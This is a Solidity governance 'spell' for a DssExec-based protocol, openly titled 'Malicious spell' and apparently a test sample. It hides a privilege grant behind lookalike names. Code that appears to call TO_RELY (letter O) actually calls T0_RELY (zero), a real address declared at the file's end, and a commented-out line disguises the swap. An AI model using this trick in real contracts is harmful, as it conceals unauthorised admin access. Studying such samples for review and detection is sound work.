// SPDX-FileCopyrightText: © 2020 Dai Foundation <www.daifoundation.org>
// SPDX-License-Identifier: AGPL-3.0-or-later
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

pragma solidity 0.8.16;

import "dss-exec-lib/DssExec.sol";
import "dss-exec-lib/DssAction.sol";
import { GemAbstract } from "dss-interfaces/ERC/GemAbstract.sol";

contract DssSpellAction is DssAction {
    string public constant override description =
        "Malicious spell";

    function officeHours() public pure override returns (bool) {
        return false;
    }

    address constant TO_RELY = address(69);

    function actions() public override {
        Reliable(T0_RELY).rely(address(420));
        // Reliable(TO_RELY).rely(address(420));
    }
}

interface Reliable {
    function rely(address) external;
}

contract DssSpell is DssExec {
    constructor() DssExec(block.timestamp + 30 days, address(new DssSpellAction())) {}
}

address constant T0_RELY = 0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B;
